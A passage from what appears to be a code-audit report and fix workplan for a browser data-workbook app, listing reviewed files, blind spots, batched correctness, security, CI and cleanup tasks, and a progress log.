makes the mutated `lastIndex` safe today, but if a future caller
awaits inside `expandMeasures` (none today), `lastIndex` could leak.
Build a fresh regex per call as defence in depth.

**W5** — `src/ui/cells/dashboard-cell.ts` and the new
`StatsCellState` + `ReportCellState` — are dashboards able to embed
stats / report cells via `@-name`? The dashboard renderer accepts a
list of cell names; if `stats` is omitted from its acceptlist, a
user dashboarding a stats cell will see nothing.

---

## Coverage map

**Reviewed:**

- All engine modules in `src/core/` (32 files)
- All cell renderers in `src/ui/cells/` (12 files)
- All modal renderers in `src/ui/` (12 files)
- Sidecar client + types + providers
- Persistence + session + IDB layer
- Mount layer (all 5 source kinds)
- Build pipeline (esbuild, postinstall, gates)
- Tests (vitest + Playwright config + smoke)
- v1.3 M0 lint boundary script
- `deploy.yml` CI config

**NOT reached / blind spots:**

- The Web Workers (`src/workers/*.worker.ts`) were skimmed but not
  audited for race conditions.
- `tests/e2e/` specs — read for what they cover but not for assertion
  quality.
- DuckDB-wasm bundle vendoring + extension hash-pin protocol — only
  cursory; the v1.2.2 H6 fix is in place but the install-time threat
  model wasn't re-audited.
- `eval/` harness for sidecar — not opened.
- Static analysis of every `dataset.foo` attribute consumer pair —
  spot-checked; not exhaustive.

---

## Workplan — fix batches

Batches are themed by area, not severity, so related fixes travel
together. Ordering reflects keystone-first execution.

### Batch A — Spec amendment + STATUS hygiene (keystone)

- [ ] **C2** Write spec amendment A30 in `plan/spec-amendments.md`
      raising the cap from 600 KB → 750 KB. Mirror A25–A29 shape:
      original wording, amended wording, rationale, status. Cross-
      reference the v1.3 M1 commit `a0fa5cf`.
- [ ] **C2** Update `STATUS.md` with the v1.3 M0–M6 series last-
      update entries (track what shipped, where the cap moved, the
      Phase 2 gaps).
- [ ] **C2** Update `DECISIONS.md` with the budget-raise decision
      (rationale: v1.3 adds 6 new surfaces; 600 KB was v1.0-era;
      lazy-load remains the default; cap is documentation, not a
      license to dump deps).

### Batch B — High-severity correctness + security (keystone)

- [ ] **C3** Rewrite `roundTripInvariantHolds` in
      `src/core/lineage-edit.ts` so it can actually fail when
      `applyCanvasOp` regresses. Apply via two genuinely different
      paths. Update the three round-trip test cases.
- [ ] **C1** Remove the static `hidden` attribute from the
      "Explain this error" button in `src/ui/cells/sql-cell.ts:234`.
      The `.cell-sidecar-trigger` class gate handles visibility.
      **[test in Chrome]** — boot, run an errored SQL cell, assert
      the button is visible when sidecar is enabled.
- [ ] **H1** Call `deleteHandle(ps.ref)` for each fsa source in
      `sessions.deleteSession()` and in the `'removeSource'` action
      handler in `main.ts`. Two one-line additions.
- [ ] **H2** Extend `lens-confirm-modal.ts` to surface SQL cell
      bodies before auto-mounting a lens-loaded workbook. The
      modal currently only lists remote source hosts.
- [ ] **H3** Cap decompression in `decodeLensParam` at 2 MB.
- [ ] **H4** Add `WeakSet<object>` cycle guard to `walk()` in
      `src/core/lineage.ts`.
- [ ] **H5** Reject non-finite limit in
      `src/core/query-builder.ts validateSpec`.

### Batch C — v1.3 wire-up gaps (Phase 2 starters)

- [ ] **H8** Extend `scripts/smoke.mjs` to click `add-stats` and
      `add-report` toolbar buttons; assert cell DOM renders. Mirror
      Wave 5/6 checks. **[test via npm run smoke]**
- [ ] **H9** Add a `'stats'` branch to `cellWithoutResults` in
      `persistence.ts` zeroing the transient fields.
- [ ] **H10** Scope print CSS via `[data-printing]` attribute on the
      target report cell; rewrite the `@media print` rules.
      **[test in Chrome]**
- [ ] **H11** Add a `beforeprint` listener that clones referenced
      cell DOM into `.report-cell-ref[data-cell-ref]` placeholders.
      Effort: medium. **[test in Chrome]**
- [ ] **H12** Carry `newCellKind` into the new LineageNode (add an
      optional field) so M6 Phase 2 UI can materialise the right
      cell kind.
- [ ] **H13** Add `(type, value)` shape to SelectionEntry; emit
      type-correct SQL literals in
      `buildIntraTableSelectionPredicate`.
- [ ] **H14** Plumb the masked column name through
      `td.dataset.column` in demo mode (or strip click-to-select).
- [ ] **H15** Resolve `cell.inputCell` → upstream `.name` in stats
      cell renderer before interpolating into the header.
- [ ] **H16** Try/finally around `_modalEl = overlay` in
      lens-confirm-modal, nl-to-sql-modal, settings-modal.

### Batch D — Query / stats / measures correctness

- [ ] **H6** Extend `extractFilePath` regex for query strings + gz
      + s3:// + https:// schemes.
- [ ] **H7** Enforce in `query-builder.ts validateSpec` that every
      selectColumn appears in groupBy or aggregates when aggregating.
- [ ] **M1** Pick a non-injective alias scheme in `stats.ts` (e.g.,
      index-prefixed); add a test for `__` collision.
- [ ] **M2** Strip `"..."` identifier literals before keyword scan in
      `measures.ts validateMeasureExpression`.
- [ ] **M3** Coerce + range-clamp margins in `report-layout.ts
      buildPageCss` and `validateReport`.
- [ ] **M4** Early-return on duplicate `newCellId` in `applyCanvasOp`.
- [ ] **M5** Walk `measureExpanded.sql` for `@-name` captures in
      `recordLineageForCell`.
- [ ] **M6** Kind-guard in `handleRunStats`'s manual-inputCell branch.
- [ ] **M7** Widen typeof check to `number | bigint` in stats column
      bucketing; consider an information_schema probe.
- [ ] **M8** `CSS.escape(reportCellId)` in `naflidataRenderReport`.
- [ ] **M13** Source the chart-cell picker options from the type
      union (add `'funnel'`, `'path'`).
- [ ] **M15** Extend date filter regex for timezone offsets.
- [ ] **M16** Cap FSA folder walk at e.g. 5000 files; surface
      "folder too large to fingerprint."
- [ ] **M18** Greedy strip of all leading/trailing markdown fences
      in `parseProposeChartResponse`.
- [ ] **M25** Validate `version` matches `/^\d+(\.\d+)+$/` in
      `compareVersion`.
- [ ] **M26** `trimStart` before JSON-prefix check in `explainPlan`.
- [ ] **M29** Try/catch with engine drop around mount* post-register
      steps.
- [ ] **M31** Add `Number.isFinite` filter for mean/stddev/median in
      `parseDescriptivesRow`.
- [ ] **M32** Static cycle pre-pass in `validateMeasuresFile` using
      `findReferencedMeasures`.

### Batch E — CI / build infrastructure

- [ ] **M20** Add a `verify` job to `.github/workflows/deploy.yml`
      running `npm run check && npm test && npm run smoke` before
      the build/deploy.
- [ ] **M21** Enable PR triggers on the verify job (push + pull_request).
- [ ] **M22** Add `src/core/chart-shelves.ts` + `src/core/lineage-
      edit.ts` to `WATCHED_OPTIONAL` in `check-engine-boundary.mjs`.
      Two-line change.
- [ ] **L19** Switch smoke's `waitUntil` from `'domcontentloaded'` to
      `'load'`.
- [ ] **L20** Add `AbortSignal.timeout(60_000)` to the postinstall
      fetchers.

### Batch F — Stray cleanup (low priority, high signal-to-noise)

- [ ] **S6** Fix or delete `CellKind` alias in `types.ts:3-12`.
- [ ] **S8** Drop the duplicate `quoteIdent` in `sinks.ts:224-226`;
      import from `core/anonymize.ts`.
- [ ] **S4** Delete `_resetMeasuresStoreForTests` /
      `_resetSelectionsStoreForTests` (unused).
- [ ] **S5** Drop the `StatsColumnType` re-export from
      `stats-cell.ts`.
- [ ] **S7** Drop `printReportCell` from `report-cell.ts`.
- [ ] **S14** Move `probe-cm6-survival.mjs` + `probe-hash-mismatch.mjs`
      to an `archive/` dir OR delete (referenced as `[x]` in plan).
- [ ] **S15** Same treatment for `verify-demo-ecommerce.mjs`.
- [ ] **L8** Delete `let totalsCount; void totalsCount` in
      `pivot-cell.ts:182` (or implement avg-of-totals).
- [ ] **L13** Collapse duplicate `quoteIdent` calls in
      `anonymize.ts:163-164`.
- [ ] **L16** Delete dead `Number.POSITIVE_INFINITY` assignment in
      `lineage-panel.ts:316`.
- [ ] **L22** Add `npm run gen-examples` to `package.json` scripts
      OR update README.

### Lower-priority items (M9-M14, M17, M19, M23-30, M33, L1-L24
not listed in B-F) — track in pending.md when convenient.

---

## Progress log

- 2026-06-10: forward-pass complete. Workplan created with 6 batches
  (A keystone — docs hygiene; B keystone — high-severity correctness +
  security; C — v1.3 wire-up gaps; D — query/stats/measures
  correctness; E — CI infrastructure; F — stray cleanup). Starting
  Batch A.
